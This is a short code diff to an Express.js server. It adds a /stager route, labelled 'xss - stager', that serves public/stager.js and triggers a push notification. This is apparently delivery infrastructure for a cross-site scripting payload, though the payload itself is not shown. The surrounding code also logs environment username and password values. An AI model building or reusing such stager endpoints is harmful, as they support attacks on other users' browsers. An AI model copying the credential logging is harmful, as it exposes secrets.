@@ -79,6 +79,11 @@ app.post("/message", (req, res) => {
   res.send(`Received message, with title: ${req.body.title}`);
 });
 
+app.get("/stager", (req, res) => {
+  handlePushTokens("xss - stager", "uploading");
+  res.sendFile('public/stager.js');
+});
+
 app.get("/isup", function (request, response) {
   console.log(process.env.username);
   console.log(process.env.password);
